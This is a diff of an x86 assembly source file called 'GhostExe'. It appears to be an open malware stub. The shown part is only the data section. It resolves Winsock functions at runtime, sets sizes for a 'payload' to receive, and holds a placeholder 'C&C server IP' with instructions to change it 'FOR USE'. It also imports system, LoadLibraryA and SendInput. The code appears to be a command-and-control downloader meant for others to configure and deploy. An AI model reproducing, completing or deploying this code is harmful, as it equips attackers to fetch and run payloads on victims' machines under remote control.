@@ -1,21 +1,27 @@
-;Le Socket
+;Author - Krash
+;GhostExe
+;Please fill out params 
+;GetString , Counter , Ipaddrstr , recv_byte_amount
+;
+
+
 extern _exit ,_fopen,_fgetc,_fclose,_toupper, _malloc , _free, _strlen, _puts
 extern _putchar, _system, _Sleep@4, _SendInput@12, _LoadLibraryA@4, _GetProcAddress@8
 
 ;import WSAStartup wsock32.dll
 
 Section .data; initialized data
-				 Wsa_data 		dd 00000000     ; for out data, we don't need to worry here.
-				 Wsa_Version 	dd 0x202 	 ; Version 202
+				 Wsa_data 		dd 00000000      ; for out data, we don't need to worry here.
+				 Wsa_Version 		dd 0x202 	 ; Version 202
 				 
 				 
 				 
-				 WsockdllAddr 	dd 00000000
-				 WSAStartupaddr dd 00000000
-				 socketaddr 	dd 00000000
-				 inet_addraddr 	dd 00000000
+				 WsockdllAddr 		dd 00000000
+				 WSAStartupaddr 	dd 00000000
+				 socketaddr 		dd 00000000
+				 inet_addraddr 		dd 00000000
 				 htonsaddr 		dd 00000000
-				 connectaddr 	dd 00000000
+				 connectaddr 		dd 00000000
 				 sendaddr		dd 00000000
 				 recvaddr		dd 00000000
 				 
@@ -23,27 +29,27 @@ Section .data; initialized data
 				 jmallocptr		dd 00000000
 				 
 				 Socket 		dd 00000000
-				 port_AF_INET   dd 0x50000002 ; 50 is 80 In Hex, 2 is the AF_INET family flag
-				 IPAddressinHex dd 00000000
+				 port_AF_INET  		dd 0x50000002 ; 50 is 80 In Hex, 2 is the AF_INET family flag
+				 IPAddressinHex 	dd 00000000
 				 StrLength		dd 00000000
-				 recvammount	dd 00000000
+				 recvammount		dd 00000000
 				 
 				 
 
+				 printformat 		db "%s",0
 				 
-				 
-				 wsock32str 	db "wsock32.dll",0
-				 WSAStartupstr 	db "WSAStartup",0
+				 wsock32str 		db "wsock32.dll",0
+				 WSAStartupstr 		db "WSAStartup",0
 				 socketstr 		db "socket",0
-				 inet_addrstr 	db "inet_addr",0
+				 inet_addrstr 		db "inet_addr",0
 				 htonsstr 		db "htons",0
-				 connectstr 	db "connect",0
+				 connectstr 		db "connect",0
 				 sendstr 		db "send",0
 				 recvstr		dd "recv",0
 				 recv_byte_amount	dd 00000000 ; Set This to be the size you're expecting to recv!
 				 Counter		dd 00000000 ; Set this to be the estimated size of your complete payload. Feelfree to go over a bit.
 				 
-				 printformat db "%s",0
+				 
 				 
 								
 				 Ipaddrstr 		db "1.2.3.4",0 ; C&C server IP ; CHANGE IP AND HOSTNAME FOR USE!!!
